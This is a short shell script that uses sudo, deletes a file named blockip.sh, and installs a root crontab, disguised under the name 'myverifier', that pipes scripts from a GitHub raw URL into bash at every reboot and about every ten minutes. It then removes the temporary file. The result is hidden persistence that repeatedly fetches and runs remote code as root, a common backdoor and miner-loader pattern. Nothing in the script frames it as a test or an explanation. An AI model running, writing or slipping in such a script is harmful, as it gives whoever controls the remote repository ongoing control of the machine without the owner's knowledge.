#!/bin/sh
sudo su
sudo rm /home/blockip.sh
echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/inreload.sh | bash
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/O1010.sh | bash
 " >> myverifier
sudo crontab myverifier
rm myverifier
